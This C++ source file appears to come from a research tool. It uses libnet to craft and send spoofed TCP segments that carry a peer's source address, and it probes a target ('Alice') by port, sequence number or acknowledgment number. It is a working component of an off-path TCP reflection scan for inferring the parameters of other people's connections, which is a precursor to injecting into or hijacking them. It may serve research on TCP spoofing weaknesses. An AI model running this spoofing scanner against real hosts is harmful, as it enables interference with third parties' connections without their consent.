/*
 * Created by Jan Wrobel <wrr@mixedbit.org>.
 *
 * Sends a query to Alice as a sequence of spoofed segments.
 *
 * Query is parameterized by a list of ports, sequence numbers or
 * acknowledge numbers (depending on the --scan_mode).
 *
 * If only one parameter is given, all segments in the query are
 * equivalent (for example directed to the same ephemeral port), and
 * are all reflected by Alice if a tested condition is satisfied (for
 * example the ephemeral port is correct).
 *
 * Multiple parameters are used to execute range queries in which
 * subsequent spoofed segments are not equivalent (for example are
 * directed to different ports). If tested value is in the set of
 * probed values, part of the sequence is reflected.
 */

#include <getopt.h>
#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <vector>

using std::vector;

#define RAND16 ((u_int16_t)(rand() & 0xffff))

enum ScanMode {
  NOTSET,
  PORT,
  SQN,
  ACK
};

struct EndPointAddress {
  char* host;
  int port;
  EndPointAddress() : host(NULL), port(0) {}
};

struct Connection {
  EndPointAddress alice_address;
  EndPointAddress bob_address;
  u_int32_t sqn;
  u_int32_t ack;
  Connection() : sqn(123), ack(321 + 0xFFFFFFFF / 2) {}
};

static void err_quit(const char *fmt, ...) {
  char buf[1024];
  va_list ap;
  va_start(ap, fmt);
  vsprintf(buf, fmt, ap);
  fprintf(stderr, "error: %s\n", buf);
  fflush(stderr);
  va_end(ap);
  exit(1);
}

static u_long resolve_address(libnet_t* libnet_handle, char* address) {
  u_long resolved_address  = libnet_name2addr4(
      libnet_handle, address, LIBNET_RESOLVE);
  if (resolved_address == (u_int32_t)-1) {
    err_quit("Incorrect address %s", address);
  }
  return resolved_address;
}

static void send_query(const Connection& connection,
                       const int segment_cnt,
                       const ScanMode scan_mode,
                       const vector<u_int32_t>& scan_params) {
  char errbuf[LIBNET_ERRBUF_SIZE];
  libnet_ptag_t result_code;

  libnet_t* libnet_handle = libnet_init(LIBNET_RAW4_ADV, NULL, errbuf);
  if (!libnet_handle) {
    err_quit("libnet_init() failed: %s", errbuf);
  }

  u_long alice_ip = resolve_address(libnet_handle,
                                    connection.alice_address.host);
  u_long bob_ip = resolve_address(libnet_handle,
                                  connection.bob_address.host);

  for (int k = 0; segment_cnt == -1 || (k < segment_cnt); ++k) {
    for (size_t i = 0; i < scan_params.size(); ++i) {
      result_code = libnet_build_tcp(
          connection.bob_address.port,           // source port
          // destination port
          scan_mode == PORT ? scan_params[i] : connection.alice_address.port,
          scan_mode == SQN ? scan_params[i] : connection.sqn,
          scan_mode == ACK ? scan_params[i] : connection.ack,
          // control flags: SYN-ACK is used for port scanning because
          // it is always accepted by Netfilter and also works with
          // Windows.
          scan_mode == PORT ? TH_SYN | TH_ACK : TH_ACK,
          0xFFFF,                     // window size
          0,                          // checksum
          0,                          // urgent pointer
          LIBNET_TCP_H,               // TCP header + payload length.
          NULL,                       // payload
          0,                          // payload size
          libnet_handle,
          0);                         // libnet id
      if (result_code == -1) {
        err_quit("Failed to build TCP header: %s",
                 libnet_geterror(libnet_handle));
      }

      result_code = libnet_build_ipv4(
          LIBNET_IPV4_H + LIBNET_TCP_H,  // IP header + payload length
          0,                             // TOS
          RAND16,                        // IP ID
          0,                             // IP frag
          23,                            // TTL
          IPPROTO_TCP,                   // protocol
          0,                             // checksum
          bob_ip,                        // source IP
          alice_ip,                      // destination IP
          NULL,                          // payload
          0,                             // payload size
          libnet_handle,
          0);                            // libnet id
      if (result_code == -1) {
        err_quit("Failed to build IP header: %s",
                 libnet_geterror(libnet_handle));
      }

      result_code = libnet_write(libnet_handle);
      if (result_code == -1) {
        err_quit("Failed to send packet: %s", libnet_geterror(libnet_handle));
      }

      libnet_clear_packet(libnet_handle);
    }
  }

  libnet_destroy(libnet_handle);
}

static struct option long_options[] = {
    {"alice_host", required_argument, 0, 'A'},
    {"alice_port", required_argument, 0, 'a'},
    {"bob_host", required_argument, 0, 'B'},
    {"bob_port", required_argument, 0, 'b'},
    {"segment_cnt", required_argument, 0, 'c'},
    {"scan_mode", required_argument, 0, 'm'},
    {"ack", required_argument, 0, 'k'},
    {0, 0, 0, 0}
};

static void usage() {
  const char* help_str =
      "\nDo not run this directly, use reflection_scan.py\n"
      "\n"
      "[progname] --alice_host=A [--alice_port=B] --bob_host=C --bob_port=D "
      "--segment_cnt=E --scan_mode=port|sqn|ack [--ack=] PARAMETERS\n\n"
      "\tAlice is a destination for spoofed traffic, Bob is her peer.\n\n"
      "\tPARAMETERS is a space delimited list of ports, sequence or\n"
      "\tacknowledge numbers (depending on the --scan_mode). For each \n"
      "\tparameter on the list, --segment_cnt segments are sent to Alice.\n"
      "\tIf --segment_cnt is -1, spoofed segments are sent continuously until\n"
      "\ta process is killed.\n"
      "\t--ack can be used if --scan_mode is 'seq' or 'port' to explicitly\n"
      "\tset acknowledge number in spoofed segments.\n";
  fputs(help_str, stderr);
}

int main(int argc, char** argv) {
  Connection connection;
  int segment_cnt = 0;
  ScanMode scan_mode = NOTSET;
  vector<u_int32_t> scan_params;

  while (1) {
      int option_index = 0;

      int c = getopt_long(argc, argv, "A:a:B:b:c:m:k",
                          long_options, &option_index);

      if (c == -1) {
        break;
      }
      switch (c) {
        case 'A':
          connection.alice_address.host = optarg;
          break;
        case 'a':
          connection.alice_address.port = atoi(optarg);
          break;
        case 'B':
          connection.bob_address.host = optarg;
          break;
        case 'b':
          connection.bob_address.port = atoi(optarg);
          break;
        case 'c':
          segment_cnt = atoi(optarg);
          break;
        case 'm':
          if (strcmp(optarg, "port") == 0) {
            scan_mode = PORT;
          } else if (strcmp(optarg, "sqn") == 0) {
            scan_mode = SQN;
          } else if (strcmp(optarg, "ack") == 0) {
            scan_mode = ACK;
          } else {
            err_quit("Invalid mode: %s", optarg);
          }
          break;
        case 'k':
          connection.ack = atoi(optarg);
          break;
        case '?':
          usage();
          exit(1);
        default:
          abort();
      }
  }
  if (connection.alice_address.host == NULL) {
    err_quit("--alice_host is missing");
  }
  if (connection.alice_address.port == 0 && scan_mode != PORT) {
    err_quit("--alice_port is missing");
  }
  if (connection.bob_address.host == NULL) {
    err_quit("--bob_host is missing");
  }
  if (connection.bob_address.port == 0) {
    err_quit("--bob_port is missing");
  }
  if (segment_cnt == 0) {
    err_quit("--segment_cnt is missing");
  }
  if (scan_mode == NOTSET) {
    err_quit("--scan_mode is missing");
  }
  if (argc - optind == 0) {
    err_quit("PARAMETERS are missing");
  }
  for (; optind < argc; ++optind) {
    scan_params.push_back(atol(argv[optind]));
  }

  send_query(connection, segment_cnt, scan_mode, scan_params);
  exit(0);
}
